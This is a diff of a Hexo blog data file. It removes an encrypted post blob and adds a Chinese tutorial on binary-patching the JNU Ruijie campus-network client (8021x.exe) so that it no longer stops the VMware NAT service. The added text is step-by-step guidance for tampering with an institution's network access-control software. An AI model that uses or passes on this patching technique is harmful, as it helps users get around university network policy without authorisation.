aaeeafd506654457aa7ff5673e9c3c57a1ad0d05892d84e1de24dfbe68691b0ca846d9fc14d110108f3aaf0092e6f297d02efab54f73f15f35ec58d2c1c43be07fc9ae98c2d090d140e98dd6905fdcdc188100b76a75ced711cbc4330cdb0f3dc0cec89979bb9ede975abdc3857a33b2e33b91bd57f44ed3e1e431fb4b44f691d0c7b44f991ee95e81d8a5a8688e4a90e93cc29e74da8358001bc25b779b128cddf88210a146d563a30f654d94177a25fcef78b10222f97dcae5400887edbf8a1c1d73eb066abb4e6178c6ea573fd720deb264b8b9f0a4e61c502900f8163d1e34544ad63fb132eea7a3034e11f045cddf76212a20292f69234782441634f29f874c298910d0f871e8b82e84399bb24c6ed596f215978cecc4426b3958146ce9e84c4e52c00a004cbee2de79a4e445830e7aff1a203ceb2361314d4fcd2c2db6cb8a568574c8e1d713522f94fdef866b01c80d1c99fbf6dd2f34c12c78c7284b8e0cf0d8d6f316e8b1232f4f1c42ab8925cc5122e323169a0a5f7a7d51d2e2c2202408346cf873c861416768e600398e4222e9438853b9355ab6dc49daa0bfc93b7c9f88c2a07cc49e8eb0b86de0bb51f7635c410bd36438fa5ff17f97f10f54744fdadf0ccf21a39a1f540d3ba38475b0c03c5de5a74bcb1b76d2b59eb04635b8314defbc0260a353f3f403f7e020c48333f14e06cf082caeef9c008f765efc11ed456fa8601545a8d64304e44719c260ec46655df79e169c83b5cb0427c85142338893c6650089c819f0b6829bcfcd5def6595f64f7bfa9458f9d4579174072628ef0850d8f99e3f87948f9a7d466bedc78f8f8fe575a9f1ea813d949b69becff44900c34e99223588ca01e254bccd018368e89993933c7a12adfff0415085aa1a7cd4998b7fd3ed95fedbdec781d8000e39b949091a43afe0643b3382301fa3aef617113761b7c991d8b59526767cba86f6c0ed1850e629f9cab4ec5418b1f288766dc3b00aed4e31a7cc18a5cdbbc90981394b8c426acc0517384f9bab289c863ae2700d2cd8aeff8479c90b20e9c89342d980c576925010b4bc2b674c7ff68187f03db023287789e3bffa25633d4279a0e9fbf79a4c02d25f23b89ed357361a78d8b933f14b3b31f7ff52b066069c253362e764a13c7b0c3120b3eed6284e13f20774eea294b6f217222cb6eed7a498091ad0a72c99a4b0d4e21fd99424be0c025092e6f6dd9eb324ed32d730b7ed690b0e85cc76b63f975987aa930711dd17c27b42d6566eeac710b314dcbee34c70a6f05b66c37196101a00daef40e94889495ed775c23c31e3999d5c4656f061f6d2e726d62947e7bf70908f60da9e322afb71bb340ea543e54c2b61c99e8033267e2bf97aaabc5a9c8e856f38ae7b36714fbe7013023a418051ba03cbb1cf2ad1a4a50cec67a654894fdfd474dea64269daac8ed1c0e4081ae1962caf2d02aee381896e5efb5cc16ea3f3acaf8f95ba0e2d08516ee89f69537e0ce983ab0f1932ae321bcafa83f5f7078793e861de5dd9bc29d64f4bd58e21cef330af7cf13be54dadc2dd3b673e581f5122adc701c0dec89799658da161b08344fa9ff264100ffb358db0775bec1d54623b6c3ea65cb7a11d673ececa27cf2f866ab960c47563873362bf945e245d74a7e5682a17f2a5d18d7e5897c4488fab50848a0420194afb9d3a01b0d866974c898ac1ce28c56ab346e36b59f424e8d30c1b434766c3f51aa0274d531ae683f35004d4f96c0b16f229fb95fbc03ef1dcd250dd8cae74b8990b75c353fece1d1c5db28047dcbaebd9d9e21cebeed4506ed1421358a89618043d18594288b746883bcc4fdf09a812ad8846659ba74cb435157be9290a68e2cd2fbdd478bd4fa849bdb765604c7c3bf140fb5a14c71d4af4460638c7c3965fba9eede8f655c12776133ddf191912e9f2c97e8e5bda65d75c9278eb50e9d7041d2380108a26c7e55ce5a19140b63f704af8c6fee675473ba08f253d0334d74c6b88f79208871a4b493277189dbbf5686546525b7059d2b0e068e8c7e215680b80db31d7efede5300b9713a7273d9e9fb0a0032e2f6b6bf7f9ea82b5d2dfae5545f6f6fabc1f939e23fcb946353b4bd2b3d63c3542ade3f50e4cebb05fa56e0215a415f682d86e6d2c596adf907fca985d2eda3d72c290c27300dc0f1c1a200380f953ecabc30cb26fbe5a5f4b7bd9bc0b3a9f891ec123081314bb1531fc785caf4382880632719bd32db3c6b9d3e4d6cf01d24daeb4ca455605d1677eb0730e0c5bbb031507233075b0d3e919d0350bb3d8464138a24cbd246932712955675b0ada4387a9a75678a15f88e359a9537b0eed12d42ab76ccb23b41c091db1c7d47a09d201f05c3a18f06b2375af6ff85c3cf980b0684672828adeaef9e51b2856271515fc8aade60da15e81c74d323b2aff26116d9df37f69e05acea4d381e523eb81acdc9f4406cd93a01f9b1a6a5ffd66d38be782053ae1163faa9a38c266ec4c633036694a39dfbe4735ad0f8e7b7a7d19a370b094ad633d676cd97b02b135dc42f64cf10629b6cd3a619727da4f78679a60d9e2949cdf975daae7124ef617dacc97e20aaa3091aacf9fdd78b6593a66418f53830395b9b9b13f8df18a166416496e1c1991a42f1a7fe6aaf765bd73a5d472b7bf6316b87361f9cfa6f98890033759abdbbac910056317a82a6b80812c0f3c2649e769e5489a453485b5b100802842db1d8c8568090687cf9e36c11ecabf5f5c22ae2f2a536fc82b9b1577adece4e1a7a1fdad257d2013c67e7673a0468f01dea2ba0f1a63a709ef6bb8b572d06227ca5ed37630343ccc374f820e904fe823c2a44d4c97e7e8ac18fad0835dd8f59d6a16558bd753dadc43d966f6bc01f90e04acb9aa0d47ffd492c1d93aa3394194912a3ac916a41db5ccbbdd9d56af9d291c27e9468e7edea5d6ee77e84d66d2da7c69ca3a396992d16c2ca283fa4a65c3470cf61e75121c4fb7ebc8b27327251a46708602128871d434e5814dd906beb0605c16bd2356fa9b60ad130503a8df015de100fa2a12ce0c91bfcafa25a3748cff935e1c261f2002e77c5d051c625e9d5393040b1ed9932437b6ac72653ff0d8b7edd901e3df1611ea6933b88c27239166e46f9daf82b97855848944497bbec7b69f3307d1c20783bea7bf82416efb5288b9ca88893a1ad863503ea1627aad355baccb77091329b053564ecf77d2aa72cea7f876a0af4c8caa215dd9ef84ebf97344acd3f460aedc10074a8374b2f45b9b0aab5a22e7ea0b2ff077cf0c5997bf4466a52c14489f699bf5dce53feb961126c25c553a6069cb5b4a49a5fbb0b4ad125d7394c0db0fc592e107e8936c35c2491c3c7f564f9f441a4be5124138df6d9ec77fac1d0a66a8ae90c92fdd7622955c0616115a582c0acb2281b88870a738968b4430be07090b5239a383fe5510d4396b8a844840742452ae0226a6cb95a1da4fdea269ebb2e3eedd7654d7b8c1016c8c13d01a1528d3237f8094839f0fd557da1fcb0d827c528c328c7e6205490db8f70164894b248dd8fcc4647b4c233e6b7136e9c22f5e60c1a188931dbb2c8edc429cd44dab805a29d5eba137ba877659579c11e4d3451d933f659e0d08c3411ba15b0f39fb0645b8b14695063fbb8af9c8eebc8eccb8a43385c0a8827e5eb4a0cea19918ea12cb12ebae25dd163bb59d6cd18ee66e08fb992dc1a1c0d6875323a28716589c63be56cf61d9b5f2992e40fc2820422b2513e43248fe402def93740c84c4e54524bddd54233add364e3deadd42171ed1b3f7cc901c9bae51c6507bf16910c0762c62573d9877c6f88ba6dc2d024a320fdd026324e43df05b24c2f99e3201669691c6de5e90be3602b37672c472899de176e64ce019ef29bc13a4ba3ae48dcd2ec8caec7a44ffccd2289574ef677356e99b0e24b2abb5052c30688ee6986db6311a1b4eaf8f964cb210b5af891e4aa2a795c446612126885d4be375e518f601f57a4f64a512fff6eb6b93576980f62478a098c0f2f35e5af11c8e8ddc737e099e17fbfe6a58eb3ed4b668eca514d348859c74cc0f5c685da6e96e9a55f069f35e519b2226c9163728d170a6d5a85b511e77e2b6f3911fbc7821fe7d3cd15d8f5df3c2cf6cd0dd8c9409b84b3b2a0bc870755b2065ecb21952f0c0068fec67c2aaeed2f7ade9fd22a35ecc5ed4d20e577a4a47dae5d6ef6323ed7b155be44866611539ed7207558bebb811c12ad7b203d711a848af95b1f8e1209541e726e6ace8bcb0792ab6bdd6b2df15d0ffa90fd8f21553004da71538b3c28f01d77d93d495ec78fff29063ec98fa668a234f7f741fe4988f6853de0be8826549a18b93038bc26556a3acc43767ffdd5c7f1ea3fbdef64c3a2c2741cc1987034dcfc14ec4d308ecea0dd15d36babdff55c11d586773420aea28c82ca40751ec839ffc6e5d9f0fa7c738181dac01ceede8c707db66bb5c75689f7ac0318bf8ad23b382399e0091737110df68946950b156dfbfe42945e3e73aaad57862b507896694e466a1a5963d4f218da13d6f3ddce147d468a740649b492c68e5b153fbe287e66a4b67e3f069f54375304fc6129d4794e31c08beb42da667215f7aeafa2ad65138b99176c07a8548c817c73076d888a41a5423ba60002e2f22604d9ac5560c1e9dd8459c9e047edb02687898e73a1642fe10dcad39a5d5afde226d1fac3100c76d9d556513cf9fc509b2c53ba12b6672bae146407d4273f342ef5c0e50a5922b49173cec10da58fe47a49c598d51cf1ba4f3742e85738fb4bbb85b67e6543bdd9ea78468eb6444effbc0ffadc878c4fd6fc2cce0574f98f05b225f591e5259edb8ffa25bf1322498a98db8345dbf07c67bade865e0373f9bff8066ae5e15087c7d682886f0363d2d56bcfe13c7deea72e802c91897967edc04fe0fa3bf008022557ccf8177e8d88a78f806f443cd88c74d3d70db34bde7a062c6633f6781fb6519f746920ae1cee9645aba1516bb28fc77a560db91c0cdade2bd49e7d8e7ba3056745a2ef007932ef31824c092e94165f413c4d7f9eb5a68809718b569e0be7bbd2ec0de28fa2a306560bb3aea3f3c215ad4144c63954c49d4c5e567cc438c99cc11dcba27af710b6b4815612dee59496c631ebfc55aa55568f77aa23a48e688bd0c69cd6377e9d708854ed83622f3c8b46506971277728b73fcca3375e11d16d25a85947bd5f3eac8008f344919c62ae27efd5160bd3b9aa5a50d75ff3d657adc8e04ff39112fd54aeddc1fb1767d94347a3f46a02dc7dca9397f29a199308ec3ae4d23848feb37eb9c7b9657e63eeedecb89e239fac67f56b6a2b43e7e1c9f0c90e1d14f8ae80844ecf13ca28eac68bd888cbf8bea712b92340439436d9ead39aef2e4f44275f4aff3e9ecfed023ee24cb26b40d74e7ac1842155e79e7d6a8fec40dc1e3e56c9adc7202c121e74a84ebd79281f8f0bb210c1744cc5c3b672f9f16ec9ddb34565d32eb11bac41f0bd5d287130e97ee3d793630b2d0c5f7ab6343df3e1fe9345ab1f2d812745f3b640af449e11fd4b74338f671230dd3d05b3ceca10fbcc1bb0bcdf954461390bf8f821eab83e84f2713cbeca5fac681fc5ea0dbfc910d8111cf355d8cd6740fd7b1099e715f44cee76c5d4cc65805f0dc54198c90dccba5d6d7e0df3892b87695a7fac3a2df2c73bd7bd918294c6be3d9d1ec82d266fe26f82532a2199c36d3cfa7ab96b0bf50bfb127319e5324e25d31148ebe0d75112dffadb31da65916bb383b8942bd360c0d43536aa454bf5c856a5139578fb905bdd3eb0ca7d4b344062f7b81a6fd1850b7297cd3657a9ffd6cefe956d00437b546e945059e538387b35b8f79e569f05f2ba31159818e0e02dc9799e3d3613c7a36d651681adfb41756b113b86bfe0e3a4badd1d428a1332287bb80d7a41ad0e8a7c6b9c26097b01598bdf540b84d19d6355cfb9df7033e28093af55b03399499290a60d42b21a191d278b3345deb8e133de8757c78bf98991d4230f0d858d4b0ac12d301b0799b745588b038a941dafecebe93943c9c97430448b11de16214f5a296ad92b1738c9bfe87478313c1849c739eca693c0cf151d52fc4ea7cd8f6126494fecadfdb44347bf50abc6f95bca4facfda4797e9ef90b28c145c940708fa88e974e3c8f6e3dc6ef521f4ca488c8d8c43fb8718a9f3fb3010f549eb55616769a1b5281584dcdd168a982776c5e1c8abc0c7931ec94393a7705e6086a2464b07c2552f2bcba2c37d468298a586a4f3592190deb6dba75bf8caf174b4f0b7f4b7478a537a8047611ed064c857ad9b7590eceef0ab53a07186de7de47b5af1f94024c1bdc127d011663aae518f04b58b8715316278960c0b42eee9e16a76f00ce73259ca0e6800fa8d757856a3759b160437251558c94254e763e9c6358a2a0fcbac98144876e8e3cdb0cfb6bbb3996267bb42852e5c054ff07f042b93b956292261b2accc1b27047f423969d7f827e3b15921e5e61f8c455bebc510ce56eabe67355c926614c44babe246360c333cccfab42020fc90264feb7a6de02a8c6dba3c6740ae6fc0395a62f40a2a35845d1c2bc3c2feeca79390ff072fac8dcbc9eb0f924d7a369f252da04b117ac7093c4d7f0650cd2575b082f4c74cd1f319227bee4363ce8a2a84a4db6eb16062fb09155c40241402e4e75d2b7312d3abc8a72efceccf4588763325944a6f6ea3db7cfaf32850a6668da98d3ac7d0d33132b415fad4cb2843ab3ee4ed4671769d0d835e7c8670c805ec472beb20fb7993575140197cf31b71c3f1c4302612f4912599de3eb75bf22589e1b1393ccb455847b7ed0179c4ff7e8863dcd823185b45251376867dd8fbb1b54dea2c5f83dfc9a062f6b0dbcb6073254d20fcaf4d1a6553d015535abfef8ba7ea03766ae9ff639fafa7708c209ea712380daff42acc8a225ecfb1272580048da92c54e73667f763d2397c5ccab3725cb60b7010860e8039d13514fde75bab133a37ddb2324efca0eef79261f4b0358295561033e8c5ed949952ac3ab81ca2e9beee196b43401902ecca470bb718b7b3e053d5f8878026431c551ce93a69d0f66a10aa104c8023f10e0a496725a48df21720ff4429ec7de87a393cf686bcd09cd7090d3914a1dd9cda3f2fba4a4c40b5df8ab1fc086f3856804e9ef867cc29d08a2d38df1e86609be2444ec5c7c832c8f39e12f4e63a504933b404b96e6aadbbc4d83d30fca8067fe4a0e191a6139dc36e395ad66dad1dfbaf5026da3e0fffe4e5b5083040b21bf74b0280cb951d4c638effed09619e65c9cf4bb0e244aba22fc3251891562e42296752fef04418801f2246864aa88ec89fe4a48c657751f2c717640afecedbf582b09b52082c894ee15579ae0ad2b3b62293d64957fd7decbd3e07fb4c5edcaa3ad366242c9d729d7b9356d74b564d60d35adef8e4217a9c52cd4a22d1f3ceced6be58b81c4def072c442c52dd4aff6a7e2c9fadc98a2e5138d422abe20c0146def5e623d44d5f055fef64a53856042f49f274a3ec9982c5ca88060f3f9db250af3bd2bb9d186f913af6ab120ddda93ea1385e63cab222220e92bdf0b68dbba17d98d99f5157c3e816c6e21a8cd32dacaffaaa6c841ee14b8451472e68db1ddd78a8a26db70bb3dea9871557dc662678a1e056eb7a64f643d829a7469557f1b7367189059aa3c2e87ee006eca2f9b926a3873694bfe5016b39d44afc0cc798c5a5944d90fcb85ddb9607797dee05d471d0cd950221b121b24bb4f92656bc193d163c342a60760207eecbf7a4a75645b6ad81dd41e447ed2f0fc010c970951e6fb302e32de3cce6f09d4b14c8bd3e11853f6ae437d1eacca209982c54820fd7349571b859e381c436202be9a4f7f59997fcec4021040e7daa05edb20d9186cfee5a9fdc33ac8870d2f085de338d09b01c6df8939de500cea0eb1bd833d41b32a7deb4c45896fbdbfe82c7acbed24bf0e8fe5183c26951234af5544a860c5209ef04b8679f31b8aae286c17dfb5c7e95891cd65cfdd806b7391299942e148fd9e0c9f060cc8afa1e4fa37fe63f6e5c36c0cda29795781700ccf6321c5d1a03378f06d78ae6cfe1536cdc4d5a48089a52a72315e70cc70627f82d31c94aa2f96fa8297bfd0b0de4875ebd2b99887236084ef631b8419cc4d75e525914e51c460f25ecef9a9c655f252fd371ceece2d62f9e90e97135d22961cc9b950e0fffe7e55585e561b2235b927cb28e32aaba7e9d9c34cf37fefe40abd6b63082695668b87f86081bc97d4b7a99b1da9bb5ae650e31f4abe9d3327beee974e46937e58a26ce2bcc69cc3353a8ac8ed89426d7c7393967d24ee8f4da583ade2a164bc19bf2fdae9d855ae7f5890b7aab0b6d7c199f4228ecd7341a2d67a541913a4e2734ed4696374a7aa2ce43897077d0759bfb60769fda6b21e7a1f38f2989590342fd391fca280a276db247c5f214e24faa3476acc896436c8c6da9372894cecc1b49405428a91c71f9acaa94a762111cb44adddabf44eedaf05a9aa6052ca5801da936399942ca686eba06b7f77bcffb564aef65049c36b4bf1a6bee73b1d69db370978b17a8ccf52029c1c612b45d14b33e34ba826dc648bf460990140bc6a9f1a05db31794d5f474fb3c341bdf8df7164415775bb9e6fdb897758caac6918600ca746339a341d5018172a899d07fd31ef000ebbf035008cb645aafd7360da8ffa0167c4e9c083c129eb77e177061438e38caffc989444ae0f562b98410d9e1d8a373864826ec490f69c9c128e80480020d0d15f55c8b650d3b5de4b0589a580c861c635076a4099c3266f5fcf462f5e9f0e9f874b891639343ccec7c941cb2a50bd7bbb2f91d7c1d37589259ba3d45d0b11571c087434ebc60c2aed6bf71fb49fcc9086313a955725dfe50788bb21fefb1217768c2b1e992fe8405ceace0d29871825cd42deba16b6a12142f02bcec78f7412fb03d1795e22dd1d11dd45bae0b4b39274fd4c66d22351efc29e43c16665e7cb7891230a800a0f90223cb2a2bfae2256c76b72e94eab677148320cb75da594edf9b149713361ee4c9a8a2279befb833005ed203a3d7c0a476870a335d32983e85c41a2def9af3c9b8510f0fc4732a447c2e6f331037decfd072c1b4bed31915f127fb3669bf7ca6da0b179a78a06db7ab65d345d50c947d369bcd074f5d95f33e2550ea6ee3e0400dc0760679a0e39d8c4b57b81244287932d880c40104a36dd3a11dfd2942df068119ca851fc1e1dad845307cc7aa7a4b0b521ea51a921154f6a51ee3f54ad88c7a67486f33720510fa682373c270279bb7d1a84d5387b2911ceac57da39b9236f3b551353f252bc0cb35297aab44f8e0ad10acd3b6cc2a266a66dee1bc4f91bf890be7e0d23f927f15093c53e4477f492a51ebff2239b6a49134dc910e40d887f0926b89f8b154e5cac55444ed82a4789bddcc0fca28671fc6083ca3ee2a9ab6036d6a3226898cda48457828879bd7319f4f5a7e63f4ca2138b02409896c2ecf10acaba381506a50f6353db2695f00e0b95d6d4855010bdf14c51a53ee220a6c4ecd38f145e93d11277082e9f923ba52bb8c14c2f74115a5850e73c9448d6140a0089a8459efb0cadc90029c36b0ca1eeb76c551f9534815c0b09523516b12a2e3966c0b07a206bdbfc8ac3fcec209c8c3fbbda77822e39f5e1efd6512fcb1dd482d81b7ede69e2fb947bd085e0e1a9ddce9c741b817fa3d123acdb2fdfd05c721bc7a5cb6c5cfe2c536ad0ce61f7446e0ee57080cb026f8da6a3f5b6943f887e4e13463361d93388e7c489b149344ec1019b11497706df2fe86a9738281a5a67280c038ae480201cde0ff58d225fe0b842e18b6f3446bd8e1f85b11a53b53ea352023f597aba1a53f31d62c19c6eae227828e2ecc4829743f651e2cbdc15f3c1b7b39612a0a9450ce0dec2d449a7e77acfcfd4eef9e682a3a4e5571cf89b656f15afe44a1994cc17e394cee6dbbc5d243c21706bbc3f356e8091e4fb88c4514e7587f4c887c7773655715a06aae026d2969a98e9aaf76bd9f319c7499c7050cc61c29ac78a1136f90f382fd72b82279a242aec69f0a69abc9829a062aef6eb7962ec3cd53e17cc2eb80e2f040a66565ed7d80454a7a04988cbd41b8f8714bd7bf937677f1e34be001dc7105b136bd261b601e08954b0c1b984a0cd4d0d6e30f5e8b58d1acebe8aa846bed6fd379c980f9476f0a1ae32dd96daebb33a6af36d2858ec03de7024fb2d65b33595ef15edf00aafff0dd904dd8a3eea753c37220ae3029ddb9ecd71439571a045b35fc4ed5467f7628df5f3df052d9027615305b503d42ad04f8891ba11f4c93d61174abc38a788aa95a04acc17838146631d023347d8659af3580976a0d5ad8481681737d6895f6007a0c42a607730e87cd675a36db5e0e7d0eef1c52151c7b144226f428af80f95d3d4d2b94d2689ecca2eab0e90bbd82e79813a73d61e34699ec4d5f93b67c78a97e1bb31c1a31c8adf82c031eb0047a41edd7715c535c8b71ddcede97d7f2d81d4d8207359e7705831da0620cd870a66a4b0e0c385706d2ef9e5c9472590f1694467af5b1cf5f751caf8ce9cadf439a1b7901cc8470e34bbb24e4a7be45c3e40d6f2846b3726f939d8c4929ddf9e1d0e92cbeaf3bc3b232c4770a7003f0240f62da0db2cb178c9518bea5fe6002c15f33c6c8a0b377406d5e2580ad77a26b052d4a80edd3df992d807abca69b4a2c0fb7c44c7e6483b4c7680978869983e67b755f47de5308879b3ef4d3e96ea79e3b0c15c1cf13a1b957932fca841474480efea077eff7cafbd06a01045fe019dcca5d2193119851a236dd21af5ce9b580273451ee3d3fc9410cfbec190a254514eb4daa08bac7cec1fd3b8f5a728f3f0dadc4ca8123b73e76738fe480e40ce331798e962c21509dbcfb62663f400718be0b623bad711e98a5cff2863df375b75f8f0a9568981238fdee7a2ad4cc34bee6b9a034b5c92ec4390713b9de3d399774ab0c2170100becacdad09eb2c540e913f93b24078d7d4d40c90f90031ed00219d3f14905ef9bc69c7a4fad8fa545ccf87a0c2d2ffdc85c2e851756290764b553fde4fd397030e1839d429fca4d407f38269dba372a7d5901cc710298c6e4672a7278a9b88e24c9f87998c7e9e0f2b777d120f1f48e9af86ea7f9012a9e73fcda4e85d4e816b1a70d3d7d0dd549874b9170023cdb8beba2ba47a55cfa68eb55e2142ec32508244440723aaa8794c1faf145d5b86c49c1af7f9</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入文章密码.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
-<script data-swup-reload-script type="module">
-import {initHBE} from "/js/plugins/hbe.js";
-  console.log("hexo-blog-encrypt: loaded.");
-    initHBE();
-</script>
+    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
+<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
+<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
+<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
+<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
+<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
+                      alt="image-20240921185459092"
+                ></p>
+<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
+                      alt="image-20240921185425761"
+                ></p>
+<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
+                      alt="image-20240921185659129"
+                ></p>
+<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
+                      alt="image-20240921191031242"
+                ></p>
+<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
+                      alt="image-20240921191124399"
+                ></p>
 ]]></content>
       <categories>
         <category>common</category>
